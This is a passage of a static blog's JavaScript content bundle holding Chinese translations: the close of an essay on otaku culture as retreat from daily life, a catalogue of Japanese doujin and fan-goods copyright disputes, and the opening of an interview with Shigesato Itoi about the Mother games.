href=\"%E8%80%8C%E6%88%91%E5%80%91%E8%83%BD%E7%9C%8B%E5%88%B0%E6%9C%89%E5%83%8F%E6%98%AF%E3%80%8A%E9%9B%AB%E3%80%8B%E3%80%81%E3%80%8ACROSS%E2%80%A0CHANNEL%E3%80%8B%E3%80%81%E3%80%8AAURA%E3%80%8B%E9%80%99%E7%A8%AE%E5%B0%87%E9%81%A9%E6%87%89%E7%A4%BE%E6%9C%83%E6%99%82%E5%87%BA%E7%8F%BE%E7%9A%84%E7%A3%A8%E6%93%A6%E6%98%87%E8%8F%AF%E8%80%8C%E6%88%90%E7%9A%84%E4%BD%9C%E5%93%81%E5%87%BA%E7%8F%BE%E3%80%82\">3</a>。並沒有那麼多御宅族自認為「我們的生活方式是建立於豐饒的日常上」。反而現代大多數的御宅族，至少從我的主觀來看，是在「難以說是豐饒的日常」或「痛苦的日常」裡享受著御宅文化的 <a target=\"_blank\" rel=\"nofollow\" href=\"%E7%94%A8%E3%80%8A%E6%88%91%E7%9A%84%E5%A6%B9%E5%A6%B9%E5%93%AA%E6%9C%89%E9%82%A3%E9%BA%BC%E5%8F%AF%E6%84%9B%E3%80%8B%E4%BE%86%E6%AF%94%E5%96%BB%E7%9A%84%E8%A9%B1%EF%BC%8C%E8%AA%AA%E3%80%8C%E6%B2%99%E7%B9%94%C2%B7%E5%B7%B4%E5%90%89%E7%B4%8D%E9%A1%9E%E5%9E%8B%E7%9A%84%E5%BE%A1%E5%AE%85%E6%97%8F%E7%9B%B8%E5%B0%8D%E5%9C%B0%E6%B8%9B%E5%B0%91%EF%BC%8C%E8%80%8C%E5%83%8F%E9%BB%91%E8%B2%93%E7%9A%84%E5%BE%A1%E5%AE%85%E6%97%8F%E5%A2%9E%E5%8A%A0%E4%BA%86%E3%80%8D%E6%9C%83%E6%AF%94%E8%BC%83%E5%A5%BD%E6%87%82%E5%90%A7%E3%80%82\">4</a>。</p>\n<p>不管網路速度有多快，在難以就職、適應社會、抱持著對將來的不安的狀況下，實在難以說這樣的日常是豐饒的——對於這些後起世代的大多數御宅們而言，「建立於豐饒的日常上的生活方式」聽來大概會有些怪異。即使真有感受到「豐饒的日常」的御宅族，想必也有許多從二十歲起就目睹朋友無法就職、夥伴在精神健康上出狀況而倒下的狀況，<strong>在極近距離下體會到看似豐饒的日常，其實不過是薄冰上的安寧罷了</strong>。</p>\n<p>從這樣的御宅族世代狀況能看出，現代的御宅族早已無法期待，也從未曾期待過「建立於豐饒的日常上的生活方式」。日常對於御宅族 (或者是對於在一定年齡以下的人們) 而言 ，是痛苦、艱困、棘手的。已經不再認為自己仍能悠哉處於豐饒的日常裡了。</p>\n<p>也就是說，我認為早期御宅族世代的人們所認知到的「日常」，和後期御宅族世代的人們認知到的「日常」之間，是有相當巨大的鴻溝的。</p>\n<h2 id=\"「御宅族文化內容描述的日常」是什麼\">「御宅族文化內容描述的日常」是什麼</h2>\n<p>而基於這之上的，現代的御宅族文化內容裡描述的日常又是什麼呢。</p>\n<p>例如京阿尼的『輕音部！』是建立在御宅族的日常上的作品嗎？</p>\n<p>我不這麼認為。</p>\n<p>『輕音部！』這樣的深夜動畫，反而是將御宅族們的日常裡厭惡或痛苦的事物除臭後，再大幅裝進那些渴求卻無法到手，或是早已遙不可及的事物。而這不僅限於『輕音部！』，各種御宅族文化內容，尤其是輕小說和深夜動畫裡所描述的，<strong>都是像「遙不可及的日常景像」、「華麗的非日常描寫」，和御宅族自身的日常相當遙遠的內容</strong>。不管是奇幻要素、超能力、和女高中生砰然心動的經歷...etc. 看來都是為了能讓御宅族與自己的日常或排外感能拉開距離用的便利裝置。</p>\n<p>御宅族早已沒有「無限的日常」了，</p>\n<p>有的只是「從日常無限地後退」。</p>\n<p>所以<strong>不論日常變得多麼嚴峻，御宅族文化裡「從日常無限地後退」的持續低音仍然不會改變吧。並且更是因為知道了人生波瀾萬丈，才會更加深愛這創造出來的世界</strong>。也才能藉此度過充滿排外感和不安的日常。</p>\n<p>所以我會認為即使大震災的後續影響十分深遠，也不會對御宅族文化內容的趨勢帶來巨大的變化。</p>\n<p>當然仍會有以大範圍災害為題材的作品開始出現吧，若是狀況演變成大量的人潮必須離開首都圈，或許也會有為了防衛對於這方面社會情勢的不安或糾葛，而讓作品主題向外擴展的可能性。而防衛災害造成的社會不安，可說是讓淨化自己的性別用的「可愛的男孩子」或「只有女孩子的砰然心動情節」，或是補償滿是排外感的無力日常的「悠閒的伙伴關係」和「非日常的超自然體驗」能夠派上用場的絕佳好主題，目前仍然難以否定其崛起的可能性。</p>\n<p>不過在日常對於現代的御宅族而言早已是充滿風險和不安的存在時，「建立於豐饒的日常」→「建立於不豐饒的日常」的大幅轉換便已無法發生——因為所謂「豐饒的日常」的幻想，早已在遠昔就被放逐了。這次的大震災對御宅族文化內容所造成的影響，也只會是讓既有的「從日常無限地後退」性質更加強化，而不會改變成為其它的存在 <a target=\"_blank\" rel=\"nofollow\" href=\"%E4%BE%8B%E5%A6%82%E5%8D%81%E5%88%86%E5%AF%AB%E5%AF%A6%E5%9C%B0%E6%8F%8F%E8%BF%B0%E5%BE%A1%E5%AE%85%E6%97%8F%E7%9A%84%E6%97%A5%E5%B8%B8\">5</a>。就如同地下鐵沙林事件和 9/11 時也是如此。</p>\n<p>對於不斷地感受到「如履薄冰的日常」而不是「豐饒的日常」的世代的御宅族，日常只是想藉由觀看動畫來忘掉的存在。而御宅族文化往後也會是強而有力的，能夠讓人們從這過於嚴峻的現實中向後退一步，用以填補心靈的補給品吧。</p>\n<h2 id=\"相關文章\">相關文章</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://togetter.com/li/123635\">希有馬氏、「震災原発事故でオタクのリアリティが変わる論」への疑義 — Togetter まとめ</a></li>\n</ul>\n","date":"2020-06-23T19:46:06.000Z","excerpt":"","printDate":"June 23, 2020","printReadingTime":"1 min read"};

var route_6 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod8
});

var Mod9 = {"title":"【譯】著作權物系爭事例","slug":"ACG-doujin-contention-history","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"https://rev.hatenablog.com/entry/2020/01/29/104700\">https://rev.hatenablog.com/entry/2020/01/29/104700</a></p>\n<hr>\n<h2 id=\"同人-cd\">同人 CD</h2>\n<h3 id=\"2009-年-12-月-26-日-「片霧式＊妄想ルンバ」中止販售\">2009 年 12 月 26 日 「片霧式＊妄想ルンバ」中止販售</h3>\n<p>由於「片霧式＊妄想ルンバ」與「空想ルンバ」（譯註：由大槻賢二和絕望少女們所推出的單曲）的實體 CD 過於相似而引發問題。歌曲演奏本身則有和 JASRAC 取得許可。講談社以「商品化權利」要求 CLOSED/UNDERGROUND 中止販售此專輯。</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://megalodon.jp/2009-1229-0222-13/www.rekka.jp/SP/091226/mousou.html\">「片霧式＊妄想ルンバ」販売中止のお知らせ</a></li>\n</ul>\n<h2 id=\"同人誌\">同人誌</h2>\n<h3 id=\"1998-年-8-月-30-日-《純愛手札》光碟事件（又稱《どぎまぎイマジネーション》事件）\">1998 年 8 月 30 日 《純愛手札》光碟事件（又稱《どぎまぎイマジネーション》事件）</h3>\n<p>由於自行製作《純愛手札》的色情動畫作為本作的後續內容，而被 Konami 起訴的事件。</p>\n<p>最後賠償了大約 200 萬日圓。</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://ja.wikipedia.org/wiki/%E3%81%A8%E3%81%8D%E3%82%81%E3%81%8D%E3%83%A1%E3%83%A2%E3%83%AA%E3%82%A2%E3%83%AB%E3%83%BB%E3%82%A2%E3%83%80%E3%83%AB%E3%83%88%E3%82%A2%E3%83%8B%E3%83%A1%E6%98%A0%E7%94%BB%E5%8C%96%E4%BA%8B%E4%BB%B6\">ときめきメモリアル・アダルトアニメ映画化事件</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://esu-kei.hatenadiary.org/entry/20090910/p1\">「ラブプラス」のコナミが訴えた二次創作の「著作権侵害」事例</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://web.archive.org/web/20160711174725/http://blog.zaq.ne.jp:80/iwasere/article/739\">そうでもなかったよ？</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.translan.com/jucc/precedent-1999-08-30.html\">「ときめきメモリアル」無断改変事件Ｂ</a></li>\n</ul>\n<h3 id=\"1999-年-1-月-《寶可夢》同人誌事件\">1999 年 1 月 《寶可夢》同人誌事件</h3>\n<p>被逮捕的作者沒有申請律師，最後待滿了總計 22 天（48 小時+10 天+10 天）的拘留期。</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.st.rim.or.jp/~nmisaki/topics/pokemon.html\">ポケモン同人誌著作権問題関連</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://my.reset.jp/~yuhto-ishikawa/fujoshi/pokemon.html\">ポケモン同人作家逮捕事件がもたらしたもの</a></li>\n</ul>\n<h3 id=\"1999-年-3-月-《巧虎》島事件\">1999 年 3 月 《巧虎》島事件</h3>\n<p>倍樂生公司（譯註：《巧虎島》的製作公司之一）要求粉絲社團代表關閉網站與禁止發行同人誌。</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://web.archive.org/web/20190331142922/http://www.geocities.co.jp/Hollywood/1751/chizaitrable.html\">最近の主な知財法関連事件簿</a></li>\n</ul>\n<h3 id=\"2005-年-3-月-《柯南》事件\">2005 年 3 月 《柯南》事件</h3>\n<blockquote>\n<p>很抱歉自 2005 年 3 月 2 號起，本社團會中止販售所有與《名偵探柯南》相關的同人誌。\n相信也有很多人知道，小學館有著「小學館所提出的著作權」。我們對此有所自覺，這是想要戲仿《名偵探科南》的人，必然無法避開的問題。\n而我也在 2005 年 3 月 2 號，收到了來自小學館出版社所提出的「侵害著作權」的存證信函。\n這是因為我這 7 至 8 年來，已經製作與販售了許多的《名偵探柯南》書籍，而小學館經由某個委託下載販售網站，得知了我們的社團的存在。</p>\n</blockquote>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://web.archive.org/web/20110212011905/http://violenceclub.dojin.com:80/conanbooks2.html\">名探偵コナンの同人誌の販売終了につきまして。</a></li>\n</ul>\n<h3 id=\"2006-年-1-月-《麵巴超人沙加》事件\">2006 年 1 月 《麵巴超人沙加》事件</h3>\n<p>由テンタイ → カンソク所發行的《麵巴超人沙加》系列作品，因為《麵包超人》原作者やなせたかし的要求，在系列作未迎來結局便完結。</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://web.archive.org/web/20070316141905/http://planchette3.net/archives/2006/01/post_69.html\">「アンパンサーガ」未完のまま終了に</a></li>\n</ul>\n<h3 id=\"2006-年-《哆啦-a-夢》最終話事件\">2006 年 《哆啦 A 夢》最終話事件</h3>\n<p>在 2005 年時，有本打著「哆啦 A 夢 最終話」名號的漫畫悄悄發售。這是某位漫畫家根據網路和電子郵件流傳的謠言，所繪製的同人誌。</p>\n<p>本書令人感動的結局，透過網路上廣受好評，在原本幾百部已算熱賣的愛好者市場中，創下了異例的 1 萬 5500 本銷售量。</p>\n<p>小學館已於隔年判斷此為「惡質的著作權侵害」，要求此位漫畫家中止和回收販售，以及停止在網路上發表內容。並且正在交涉賠償損害的相關事宜，不排除會進行刑事告訴。</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://web.archive.org/web/20070505060331/http://www.sankei.co.jp/culture/enterme/070201/ent070201002.htm\">知はうごく：著作権攻防（６－３）模倣が生む才能</a></li>\n</ul>\n<h3 id=\"2017-年-仿製《fate-go》logo\">2017 年 仿製《Fate GO》LOGO</h3>\n<blockquote>\n<p>【報告】關於拙著同人誌《Grand Order/Alternative》上卷，由於權利持有人通知了 Melon books 本書已經牴觸二次創作規約，要求停止販售。因此本書目前已進入停止販售的狀態，並且下架了販售網頁。</p>\n</blockquote>\n<p>從厚度、質感與新刊外觀到諸多細節，都和《TYPE-MOON BOOKS》的設計如出一轍。字體、排板、設計不必多說，主體的小說也是極為「Fate」的內容。</p>\n<blockquote class=\"twitter-tweet\"><p lang=\"ja\" dir=\"ltr\">【ご報告】拙著同人誌『Grand Order/Alternative』上巻についてご報告です。二次創作ガイドラインの抵触を理由とした販売停止の申立てが、権利元よりメロンブックス様に届いた為、現在本作は販売停止状態となっています。通販ページも無い状態です。(1/6)</p>&mdash; 橋本 (@hasidream) <a href=\"https://twitter.com/hasidream/status/917707692872941568?ref_src=twsrc%5Etfw\">October 10, 2017</a></blockquote>\n\n<h2 id=\"刪除網路內容\">刪除網路內容</h2>\n<h3 id=\"2009-年-12-月初\">2009 年 12 月初</h3>\n<p>可能不清楚來龍去脈的人會完全搞不懂，總之就是徹底化身（偽裝成像是當事人在更新）成《Love Plus》這款遊戲的角色「姊崎寧寧」的部落格和 mixi 帳號、twitter 帳號，完全地被 Konami 刪除了。</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://web.archive.org/web/20190414034929/https://wivern.exblog.jp/12466904/\">姉ケ崎寧々、享年 18 歳</a></li>\n</ul>\n<h2 id=\"發表著作權的使用方針\">發表著作權的使用方針</h2>\n<h3 id=\"1998-年-日昇事件\">1998 年 日昇事件</h3>\n<p>方才日昇股份有限公司發表了禁止在網路上使用該公司著作權物的聲明。此聲明將適用於除了一部份的企業之外的整體網路。並且沒有對於非營利或個人營運的內容區分。插畫與小說這類內容的「著作權物二次利用」也需要原著作者的使用許可，因此實質上是不認同一切的使用方式。</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://web.archive.org/web/20110511202740/http://sapporo.cool.ne.jp/zakovsky/aten.htm\">著作権について</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://web.archive.org/web/20070209133334/http://www.yo.rim.or.jp:80/~sagi/aniheya/zakkicho.html\">アニメファンと著作権問題</a></li>\n</ul>\n<h2 id=\"抄襲相關\">抄襲相關</h2>\n<h3 id=\"2000-年-4-月-clamp-與-「fair-wind」的描圖事件\">2000 年 4 月 CLAMP 與 「Fair Wind」的描圖事件</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://web.archive.org/web/20190326193950/http://www.geocities.co.jp/WallStreet-Stock/5228/keii.html\">トレースサークル「Fair Wind」を巡る経緯</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://web.archive.org/web/20200804140916/http://red.ribbon.to/~fan/sto.html\">知って欲しい事件</a></li>\n</ul>\n<h3 id=\"2006-年-12-月-cut-a-dash-禁止手持（a．m．r）袋子的參加者排隊\">2006 年 12 月 Cut a dash 禁止手持（A．M．R）袋子的參加者排隊</h3>\n<p>由於池上茜（Ａ・Ｍ・Ｒ）被發現描圖與抄襲了 323 的畫，Cut a dash 在 Comike 71 禁止了手持（A．M．R）袋子的參加者列隊。</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://web.archive.org/web/20100819173218/http://seripa.hp.infoseek.co.jp:80/\">池上茜（Ａ・Ｍ・Ｒ）トレス・パクリ検証サイト</a></li>\n</ul>\n<h2 id=\"實體物品\">實體物品</h2>\n<h3 id=\"2007-年-12-月-18-日-crypton-枕\">2007 年 12 月 18 日 Crypton 枕</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://clockhearts.net/\">CLOCK☆HEARTS PLUS</a></li>\n</ul>\n<h3 id=\"2011-年-qb-玩偶\">2011 年 QB 玩偶</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://web.archive.org/web/20120128075603/http://blog.esuteru.com/archives/3725653.html\">【同人サークル】『キュゥべえ』ぬいぐるみ「版権許諾を取って頒布を目指した」 → 許可取る前から予約開始 → 販売中止へ</a></li>\n</ul>\n<h3 id=\"2013-年-進擊的巨人-週邊\">2013 年 進擊的巨人 週邊</h3>\n<blockquote class=\"twitter-tweet\"><p lang=\"ja\" dir=\"ltr\">バッチリ違法です。厳正に対処します。RT <a href=\"https://twitter.com/yosinosan?ref_src=twsrc%5Etfw\">@yosinosan</a>: <a href=\"https://twitter.com/ShingekiKyojin?ref_src=twsrc%5Etfw\">@ShingekiKyojin</a> 質問です。こちらのサイトで販売しているグッズは公式に販売している物でしょうか？<a href=\"http://t.co/0Mciiv9RX6\">http://t.co/0Mciiv9RX6</a></p>&mdash; 「進撃の巨人」担当編集者バック (@ShingekiKyojin) <a href=\"https://twitter.com/ShingekiKyojin/status/349722796089290753?ref_src=twsrc%5Etfw\">June 26, 2013</a></blockquote>\n\n<h3 id=\"2020-年-1-月-29-日-偶像活動-同人-t-shirt-炎上問題\">2020 年 1 月 29 日 偶像活動! 同人 T-shirt 炎上問題</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://togetter.com/li/1461224\">【再追記】アイカツ同人 T シャツ（パジャマ）炎上 → 頒布中止問題【ユニパレ】</a></li>\n</ul>\n<blockquote class=\"twitter-tweet\"><p lang=\"ja\" dir=\"ltr\">アイカツオンパレード！ユニットライブツアーユニパレ！　ご来場のお客様へ注意事項のご案内になります。<a href=\"https://t.co/bOVkBHQ4mg\">https://t.co/bOVkBHQ4mg</a><a href=\"https://twitter.com/hashtag/aikatsu?src=hash&amp;ref_src=twsrc%5Etfw\">#aikatsu</a> <a href=\"https://twitter.com/hashtag/%E3%82%A2%E3%82%A4%E3%82%AB%E3%83%84%E3%82%AA%E3%83%B3%E3%83%91%E3%83%AC%E3%83%BC%E3%83%89?src=hash&amp;ref_src=twsrc%5Etfw\">#アイカツオンパレード</a> <a href=\"https://twitter.com/hashtag/%E3%82%A2%E3%82%A4%E3%82%AB%E3%83%84?src=hash&amp;ref_src=twsrc%5Etfw\">#アイカツ</a></p>&mdash; BEST FRIENDS！official (@BEST_FRIENDS_AK) <a href=\"https://twitter.com/BEST_FRIENDS_AK/status/1218153596358782976?ref_src=twsrc%5Etfw\">January 17, 2020</a></blockquote>\n\n<h2 id=\"特攝戰隊\">特攝戰隊</h2>\n<h3 id=\"2008-年-服裝\">2008 年 服裝</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://web.archive.org/web/20090424081033/http://sankei.jp.msn.com:80/affairs/crime/080926/crm0809262046042-n1.htm\">堕ちたご当地ヒーロー　茨城の「イバライガー」逮捕</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://geromi.hatenadiary.org/entry/20081026/1224962783\">手製のコスプレ衣装を出品し逮捕・著作権</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.asahi.com/showbiz/manga/TKY200810200417.html\">正義の味方捕まる　茨城ご当地ヒーロー「イバライガー」</a></li>\n</ul>\n<h3 id=\"2013-年-cosplay\">2013 年 Cosplay</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://web.archive.org/web/20150907190443/http://www.47news.jp:80/CN/201309/CN2013092501001287.html\">違法コスプレ販売容疑で社長逮捕　ネット販売３億円か</a></li>\n</ul>\n<h2 id=\"魔改造-figure\">魔改造 Figure</h2>\n<h3 id=\"2011-年-假面騎士-w-figure-魔改造\">2011 年 假面騎士 W Figure 魔改造</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://web.archive.org/web/20110122180013/http://www.yomiuri.co.jp:80/e-japan/niigata/news/20110119-OYT8T00091.htm\">改造フィギュア販売　２人逮捕</a></li>\n</ul>\n<h3 id=\"2012-年-宣稱是魔改造-實則是盜版商品的案例\">2012 年 宣稱是魔改造 實則是盜版商品的案例</h3>\n<p>與前一件「2011 年 假面騎士 W Figure 魔改造」事件不同，此次事件不是「改造正規品」，而是製作「版權角色」的「誘發他人性欲好奇心」的 Figure 並且輸入販售的案例。目前仍然不清楚這些商品是否為量產品，以及是由誰所製作的。</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://web.archive.org/web/20120601225733/http://www.yomiuri.co.jp:80/national/news/20120530-OYT1T00690.htm\">ワンピースの「魔改造フィギュア」で著作権侵害</a></li>\n</ul>\n<h3 id=\"2019-年-1-月-18-日-《love-live》改造-figure\">2019 年 1 月 18 日 《Love Live!》改造 Figure</h3>\n<p>茨城縣警稲敷署於 2019 年 1 月 17 日，以違反著作權法的嫌疑逮捕了販售擅自修改人氣動畫《Love Live!》角色 Figure 的嫌犯。嫌犯以「做為生活費的補足」承認了嫌疑。</p>\n<p>嫌犯於去年的 9 月 6 日，將《Love Live!》的角色「矢澤妮可」的 Figure 擅自組裝至另一個 Figure 的身體上，並且拿至拍賣網站上販售。</p>\n<p>根據稲敷署提供資料，茨城縣警是於去年秋天於網路上巡邏時發現此 Figure，在搜索的過程中查明為小山嫌疑犯。</p>\n<p>稲敷署於小山嫌疑犯的家中查獲了超過 1 千具以上的女性角色 Figure，正在調查是否還有其它嫌疑。</p>\n<h2 id=\"盜版業者\">盜版業者</h2>\n<h3 id=\"2015-年-販賣《love-live》盜版別章\">2015 年 販賣《Love Live!》盜版別章</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.sankei.com/affairs/news/150706/afr1507060017-n1.html\">「ラブライブ！」の偽バッジ販売容疑で男逮捕　２００万円以上売り上げか</a></li>\n</ul>\n<h3 id=\"2016-年-販賣《新世紀福音戰士》手機套與各種盜版週邊\">2016 年 販賣《新世紀福音戰士》手機套與各種盜版週邊</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://dobonsokuhou.jp/blog-entry-525.html\">【パチモングッズ】人気アニメの偽グッズを販売　押収品からは「艦これ」「ラブライブ」「ごちうさ」も　夫婦逮捕</a></li>\n</ul>\n<h3 id=\"2017-年-販賣《少女與戰車》複製貼紙\">2017 年 販賣《少女與戰車》複製貼紙</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.asahi.com/articles/ASKCH41HXKCHPPZB003.html\">岡山）「ガールズ＆パンツァー」複製ステッカー販売容疑</a></li>\n</ul>\n<h3 id=\"2019-年-販賣《love-live-sunshine》裸體印刷抱枕套\">2019 年 販賣《Love Live! Sunshine!!》裸體印刷抱枕套</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.sankei.com/affairs/news/190912/afr1909120026-n1.html\">「ラブライブ！」キャラクターの裸体印刷、抱き枕カバー販売　容疑の５０歳男逮捕　茨城県警</a></li>\n</ul>\n<h2 id=\"商業軟體\">商業軟體</h2>\n<h3 id=\"戲仿《eva》的商業色情遊戲\">戲仿《EVA》的商業色情遊戲</h3>\n<p>原本由本氣汁公司預定發售的遊戲《僕らのいきなり同棲計画!》，由於收到版權持有者的聯絡，更改了遊戲內角色的色調，改成了 2P 色後發售。</p>\n<p>另外還有極度相似《校園迷糊大王》的《おしかけ Scramble!!》，和極度相似《涼宮春日的憂鬱》的 18 禁遊戲《えむすくらんぶる！》，但並沒有成為檯面上的問題。</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://temple-knights.com/archives/2007/12/eva-galge.html\">エヴァンゲリオン似のエロゲ『僕らのいきなり同棲計画！』発売中止！</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.akibablog.net/archives/2008/01/eva-eroge-2p-080119.html\">僕らのいきなり同棲計画！発売　「（2P カラーの）髪の色は心眼で」</a></li>\n</ul>\n<h2 id=\"同人軟體中止頒布案例\">同人軟體中止頒布案例</h2>\n<p>由於同人軟體與同人誌不同，會牽涉到「商品化權（授權）」因而有更多惹怒版權持有者的案例。以下是過去的同人軟體頒布中止的事例，但不保證其內容的正確性。</p>\n<p>■2000 年 03 月</p>\n<ul>\n<li>作品名 : Nightmare 4.1</li>\n<li>社團名 : Escape Software</li>\n<li>版權持有者 : 角川書店</li>\n<li>頒布中止。社團活動停止。</li>\n</ul>\n<p>■2002 年 04 月</p>\n<ul>\n<li>作品名 : 反転裁判</li>\n<li>社團名 : PsG System</li>\n<li>版權持有者 : Capcom</li>\n<li>宣布無限期延期後，將作品標題改為「月の裁」再次頒布。</li>\n</ul>\n<p>■2003 年 05 月</p>\n<ul>\n<li>作品名 : CYBERGRANDPRIX CHAMPIONSHIP</li>\n<li>社團名 : PROJECT YNP</li>\n<li>版權持有者 : 日昇</li>\n<li>向日昇取得版權後，於日後重新頒布。</li>\n</ul>\n<p>■2004 年 09 月</p>\n<ul>\n<li>作品名 : 落としマス</li>\n<li>社團名 : ClassiC 思考回路</li>\n<li>版權持有者 : 角川書店</li>\n<li>中止再販。</li>\n</ul>\n<p>■2005 年 12 月</p>\n<ul>\n<li>作品名 : MALIGNANT VARIATION FINAL</li>\n<li>社團名 : AQUA STYLE</li>\n<li>版權持有者 : 不明</li>\n<li>停止頒布。</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://blog.livedoor.jp/zot666/archives/50461057.html\">冬コミ直前の発表中止な AQUASTYLE（アクアスタイル）作品の日本橋での在庫は？</a></li>\n</ul>\n<p>■2007 年 02 月（10 月？）</p>\n<ul>\n<li>作品名 : 実況ナマハメエロ野球</li>\n<li>社團名 : 劇団近未来</li>\n<li>版權持有者 : Konami</li>\n<li>中止頒布。</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://kanose.hateblo.jp/entry/20080113/konamidoujin\">『実況パワフルプロ野球』シリーズを元ネタにした 18 禁同人ソフトを出したサークルがコナミに謝罪</a></li>\n</ul>\n<p>■2008 年 02 月</p>\n<ul>\n<li>作品名 : 戦え！俺の初音ミク</li>\n<li>社團名 : EJIN 研究所／MURDER 工房</li>\n<li>版權持有者 : Crypton</li>\n<li>中止頒布。</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://anond.hatelabo.jp/20080212104135\">俺の初音ミク頒布停止について</a></li>\n</ul>\n<p>■2008 年 02 月</p>\n<ul>\n<li>作品名 : 涼宮ハルヒの激闘</li>\n<li>社團名 : souvenir circ.</li>\n<li>版權持有者 : 角川書店</li>\n<li>中止頒布。</li>\n</ul>\n<p>■2010 年 02 月</p>\n<ul>\n<li>作品名：MAMA3</li>\n<li>社團名：AloMarron</li>\n<li>版權持有者：Konami</li>\n<li>中止頒布，刪除內容。</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://temple-knights.com/archives/2011/02/mqma3.html\">同人ゲーム『MQMA3』が著作権侵害の警告を受け公開停止</a></li>\n</ul>\n<p>■2013 年 10 月</p>\n<ul>\n<li>角川發出勸告要求停止販賣《艦隊收藏》二次創作物</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://web.archive.org/web/20190503095252/https://twitter.com/dotetinyui/status/384984586314203136\">岡田ゆい@6/30 大阪 auf Twitter: &quot;ま、かも、らしいと憶測をしても意味ないので。とりあえずはうちの艦これ ROM ２種類９・１０月新刊は DL.getchu さんから販売削除を受けました。理由は著作権侵害ですってことです。それだけは事実です。http://t.co/faiI3kkDa6&quot;</a></li>\n</ul>\n","date":"2020-09-25T05:02:10.000Z","excerpt":"","printDate":"September 25, 2020","printReadingTime":"4 min read"};

var route_29 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod9
});

var Mod10 = {"title":"【譯】《Mother》的心情。（0）","slug":"ACG-emotion-of-mother-00","html":"<p>在距離最近的地方，傾聽這款不可思議的遊戲的故事。</p>\n<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"https://www.1101.com/MOTHER/MOTHER_itoi.html\">『MOTHER』の気持ち。</a></p>\n<hr>\n<p>於 1989 年發行的《Mother》，和 1994 年發行的《Mother2 ～基格的逆襲～》這兩款遊戲，會在 2003 年 6 月 20 號於 Gameboy Advance 平台上推出合輯作品《Mother 1+2》。</p>\n<p>雖然這並不是部非常賣座的作品，但我們從總是十分熱心分享的製作人糸井重里身上，聽到了許多關於這款不可思議的遊戲的故事。（因為他正好就在這裡）</p>\n<p>還有關於正在製作中的「那部作品」！</p>\n<hr>\n<p>《Mother》和《Mother 2》要統合成《Mother 1+2》在 Gameboy Advance 平台上推出。於是幾日新聞準備了一次特別的連載。訪問身為製作《Mother》，而非主宰幾日新聞的糸井重里，一探《Mother》這款遊戲。</p>\n<p>前幾天，我們花了幾個小時進行取材，裡頭談到的內容可說相當地緊密。或許當事人糸井重里並沒有這個意思。但他所吐出的一字一語，都可說是來自糸井重里最深處的話語。</p>\n<p>在訪談的最後，糸井重里不可歇般地開始談到《Mother 3》，或許就是得有這樣的討論順序，才能讓糸井重里談論《Mother 3》吧。</p>\n<p>我們打算依照訪談的原序刊登，於最後附上《Mother 3》的告知內容。</p>\n<p>但考量到《Mother 1+2》的推出，必然會有許多人為了尋找《Mother 3》的資訊前來此處。所以我們再次緊急地向糸井重里做了取材，並做為於今天開始的特別連載的開頭內容刊登。</p>\n<hr>\n<h2 id=\"～開頭，首先問到《mother-3》～\">～開頭，首先問到《Mother 3》～</h2>\n<p>——也就是說，目前《Mother 3》正在製作中嗎？</p>\n<p>糸井：是的。只是啊，因為我是製作遊戲的「前科犯」，在做這種發表的時候，都會很害怕自己是否會重蹈覆轍，而變得非常慎重。其實我是想在完成之後才作發表的。但是《Mother 1+2》推出後，肯定會有人問說「那《Mother 3》還會出嗎？」。我並不想明明已經在製作，卻還要再三騙人說「不會出了」。所以就先和大家說聲「目前正在製作中」。</p>\n<p>——請告訴我們您對於一度中止開發，再次決定推出的《Mother 